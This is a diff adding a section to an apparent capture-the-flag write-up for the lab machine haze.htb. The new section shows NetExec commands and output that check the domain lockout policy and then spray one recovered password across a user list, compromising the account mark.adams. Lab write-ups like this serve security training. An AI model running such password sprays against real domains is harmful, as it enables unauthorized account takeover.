@@ -348,4 +348,44 @@ There are no kerberoastalbe users and none are AS-REP roastable
 
 Now might be a good time to collect bloodhound data
 
-#
+# Password spray leads to user compromise
+
+```python
+nxc ldap dc01.haze.htb -u paul.taylor -p 'Ld@p_Auth_Sp1unk@2k24' --pass-pol                                    
+LDAP        10.129.11.223   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [+] Dumping password info for domain: haze.htb
+LDAP        10.129.11.223   389    DC01             Minimum password length: 7
+LDAP        10.129.11.223   389    DC01             Password history length: 24
+LDAP        10.129.11.223   389    DC01             Maximum password age: 41 days 23 hours 52 minutes 
+LDAP        10.129.11.223   389    DC01             
+LDAP        10.129.11.223   389    DC01             Password Complexity Flags: 000001
+LDAP        10.129.11.223   389    DC01                 Domain Refuse Password Change: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password Store Cleartext: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password Lockout Admins: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password No Clear Change: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password No Anon Change: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password Complex: 1
+LDAP        10.129.11.223   389    DC01             
+LDAP        10.129.11.223   389    DC01             Minimum password age: 23 hours 52 minutes 
+LDAP        10.129.11.223   389    DC01             Reset Account Lockout Counter: 30 minutes 
+LDAP        10.129.11.223   389    DC01             Locked Account Duration: 30 minutes 
+LDAP        10.129.11.223   389    DC01             Account Lockout Threshold: 0
+LDAP        10.129.11.223   389    DC01             Forced Log off Time: Not Set
+```
+First ill check the lockout policy, its not set here so i dont have to worry
+
+```python
+nxc ldap dc01.haze.htb -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success
+LDAP        10.129.11.223   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24
+```
+As seen here i have now compromised the user `mark.adams`
